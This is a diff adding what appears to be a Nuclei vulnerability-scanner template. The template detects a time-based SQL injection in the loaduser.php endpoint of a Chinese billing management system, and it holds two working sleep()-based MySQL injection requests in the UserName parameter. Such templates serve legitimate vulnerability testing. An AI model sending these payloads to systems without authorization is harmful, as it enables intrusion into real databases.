@@ -1,0 +1,30 @@
+id: lhzy-billing-management-system-sqli
+info:
+  name: "蓝海卓越计费管理系统 loaduser.php SQL注入"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 蓝海卓越计费管理系统
+
+http:
+  - raw:
+      - |
+        GET /ajax/loaduser.php?UserName=1'+AND+(SELECT+2*(IF((SELECT+*+FROM+(SELECT+CONCAT(0x716a7a6a71,(SELECT+(ELT(3776=3776,1))),sleep(5),0x78))s),+8446744073709551610,+8446744073709551610)))--+opzJ HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /ajax/loaduser.php?UserName=1'+AND+(SELECT+2*(IF((SELECT+*+FROM+(SELECT+CONCAT(0x716a7a6a71,(SELECT+(ELT(3776=3776,1))),sleep(8),0x78))s),+8446744073709551610,+8446744073709551610)))--+opzJ HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "MySQL Query Error"
+          - "DataBase Error"
+        part: body
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
+      - type: status
+        status:
+          - 200
